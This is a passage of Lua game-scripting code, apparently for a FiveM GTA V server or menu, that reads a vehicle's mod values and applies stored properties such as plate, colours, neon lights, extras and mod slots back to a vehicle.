			modTransmission   = GetVehicleMod(vehicle, 13),
			modHorns          = GetVehicleMod(vehicle, 14),
			modSuspension     = GetVehicleMod(vehicle, 15),
			modArmor          = GetVehicleMod(vehicle, 16),

			modTurbo          = IsToggleModOn(vehicle, 18),
			modSmokeEnabled   = IsToggleModOn(vehicle, 20),
			modXenon          = IsToggleModOn(vehicle, 22),

			modFrontWheels    = GetVehicleMod(vehicle, 23),
			modBackWheels     = GetVehicleMod(vehicle, 24),

			modPlateHolder    = GetVehicleMod(vehicle, 25),
			modVanityPlate    = GetVehicleMod(vehicle, 26),
			modTrimA          = GetVehicleMod(vehicle, 27),
			modOrnaments      = GetVehicleMod(vehicle, 28),
			modDashboard      = GetVehicleMod(vehicle, 29),
			modDial           = GetVehicleMod(vehicle, 30),
			modDoorSpeaker    = GetVehicleMod(vehicle, 31),
			modSeats          = GetVehicleMod(vehicle, 32),
			modSteeringWheel  = GetVehicleMod(vehicle, 33),
			modShifterLeavers = GetVehicleMod(vehicle, 34),
			modAPlate         = GetVehicleMod(vehicle, 35),
			modSpeakers       = GetVehicleMod(vehicle, 36),
			modTrunk          = GetVehicleMod(vehicle, 37),
			modHydrolic       = GetVehicleMod(vehicle, 38),
			modEngineBlock    = GetVehicleMod(vehicle, 39),
			modAirFilter      = GetVehicleMod(vehicle, 40),
			modStruts         = GetVehicleMod(vehicle, 41),
			modArchCover      = GetVehicleMod(vehicle, 42),
			modAerials        = GetVehicleMod(vehicle, 43),
			modTrimB          = GetVehicleMod(vehicle, 44),
			modTank           = GetVehicleMod(vehicle, 45),
			modWindows        = GetVehicleMod(vehicle, 46),
			modLivery         = GetVehicleLivery(vehicle)
		}
	else
		return
	end
end

NertigelFunc.Game.SetVehicleProperties = function(vehicle, props)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		SetVehicleModKit(vehicle, 0)

		if props.plate then SetVehicleNumberPlateText(vehicle, props.plate) end
		if props.plateIndex then SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex) end
		if props.bodyHealth then SetVehicleBodyHealth(vehicle, props.bodyHealth + 0.0) end
		if props.engineHealth then SetVehicleEngineHealth(vehicle, props.engineHealth + 0.0) end
		if props.fuelLevel then SetVehicleFuelLevel(vehicle, props.fuelLevel + 0.0) end
		if props.dirtLevel then SetVehicleDirtLevel(vehicle, props.dirtLevel + 0.0) end
		if props.color1 then SetVehicleColours(vehicle, props.color1, colorSecondary) end
		if props.color2 then SetVehicleColours(vehicle, props.color1 or colorPrimary, props.color2) end
		if props.pearlescentColor then SetVehicleExtraColours(vehicle, props.pearlescentColor, wheelColor) end
		if props.wheelColor then SetVehicleExtraColours(vehicle, props.pearlescentColor or pearlescentColor, props.wheelColor) end
		if props.wheels then SetVehicleWheelType(vehicle, props.wheels) end
		if props.windowTint then SetVehicleWindowTint(vehicle, props.windowTint) end

		if props.neonEnabled then
			SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
			SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
			SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
			SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
		end

		if props.extras then
			for id,enabled in pairs(props.extras) do
				if enabled then
					SetVehicleExtra(vehicle, tonumber(id), 0)
				else
					SetVehicleExtra(vehicle, tonumber(id), 1)
				end
			end
		end

		if props.neonColor then SetVehicleNeonLightsColour(vehicle, props.neonColor[1], props.neonColor[2], props.neonColor[3]) end
		if props.xenonColor then SetVehicleXenonLightsColour(vehicle, props.xenonColor) end
		if props.modSmokeEnabled then ToggleVehicleMod(vehicle, 20, true) end
		if props.tyreSmokeColor then SetVehicleTyreSmokeColor(vehicle, props.tyreSmokeColor[1], props.tyreSmokeColor[2], props.tyreSmokeColor[3]) end
		if props.modSpoilers then SetVehicleMod(vehicle, 0, props.modSpoilers, false) end
		if props.modFrontBumper then SetVehicleMod(vehicle, 1, props.modFrontBumper, false) end
		if props.modRearBumper then SetVehicleMod(vehicle, 2, props.modRearBumper, false) end
		if props.modSideSkirt then SetVehicleMod(vehicle, 3, props.modSideSkirt, false) end
		if props.modExhaust then SetVehicleMod(vehicle, 4, props.modExhaust, false) end
		if props.modFrame then SetVehicleMod(vehicle, 5, props.modFrame, false) end
		if props.modGrille then SetVehicleMod(vehicle, 6, props.modGrille, false) end
		if props.modHood then SetVehicleMod(vehicle, 7, props.modHood, false) end
		if props.modFender then SetVehicleMod(vehicle, 8, props.modFender, false) end
		if props.modRightFender then SetVehicleMod(vehicle, 9, props.modRightFender, false) end
		if props.modRoof then SetVehicleMod(vehicle, 10, props.modRoof, false) end
		if props.modEngine then SetVehicleMod(vehicle, 11, props.modEngine, false) end
		if props.modBrakes then SetVehicleMod(vehicle, 12, props.modBrakes, false) end
		if props.modTransmission then SetVehicleMod(vehicle, 13, props.modTransmission, false) end
		if props.modHorns then SetVehicleMod(vehicle, 14, props.modHorns, false) end
		if props.modSuspension then SetVehicleMod(vehicle, 15, props.modSuspension, false) end
		if props.modArmor then SetVehicleMod(vehicle, 16, props.modArmor, false) end
		if props.modTurbo then ToggleVehicleMod(vehicle,  18, props.modTurbo) end
		if props.modXenon then ToggleVehicleMod(vehicle,  22, props.modXenon) end
		if props.modFrontWheels then SetVehicleMod(vehicle, 23, props.modFrontWheels, false) end
		if props.modBackWheels then SetVehicleMod(vehicle, 24, props.modBackWheels, false) end
		if props.modPlateHolder then SetVehicleMod(vehicle, 25, props.modPlateHolder, false) end
		if props.modVanityPlate then SetVehicleMod(vehicle, 26, props.modVanityPlate, false) end
		if props.modTrimA then SetVehicleMod(vehicle, 27, props.modTrimA, false) end
		if props.modOrnaments then SetVehicleMod(vehicle, 28, props.modOrnaments, false) end
		if props.modDashboard then SetVehicleMod(vehicle, 29, props.modDashboard, false) end
		if props.modDial then SetVehicleMod(vehicle, 30, props.modDial, false) end
		if props.modDoorSpeaker then SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false) end
		if props.modSeats then SetVehicleMod(vehicle, 32, props.modSeats, false) end
		if props.modSteeringWheel then SetVehicleMod(vehicle, 33, props.modSteeringWheel, false) end
		if props.modShifterLeavers then SetVehicleMod(vehicle, 34, props.modShifterLeavers, false) end
		if props.modAPlate then SetVehicleMod(vehicle, 35, props.modAPlate, false) end
		if props.modSpeakers then SetVehicleMod(vehicle, 36, props.modSpeakers, false) end
		if props.modTrunk then SetVehicleMod(vehicle, 37, props.modTrunk, false) end
		if props.modHydrolic then SetVehicleMod(vehicle, 38, props.modHydrolic, false) end
		if props.modEngineBlock then SetVehicleMod(vehicle, 39, props.modEngineBlock, false) end
		if props.modAirFilter then SetVehicleMod(vehicle, 40, props.modAirFilter, false) end
		if props.modStruts then SetVehicleMod(vehicle, 41, props.modStruts, false) end
		if props.modArchCover then SetVehicleMod(vehicle, 42, props.modArchCover, false) end
		if props.modAerials then SetVehicleMod(vehicle, 43, props.modAerials, false) end
		if props.modTrimB then SetVehicleMod(vehicle, 44, props.modTrimB, false) end
		if props.modTank then SetVehicleMod(vehicle, 45, props.modTank, false) end
		if props.modWindows then SetVehicleMod(vehicle, 46, props.modWindows, false) end

		if props.modLivery then
			SetVehicleMod(vehicle, 48, props.modLivery, false)
			SetVehicleLivery(vehicle, props.modLivery)
		end
	end
end
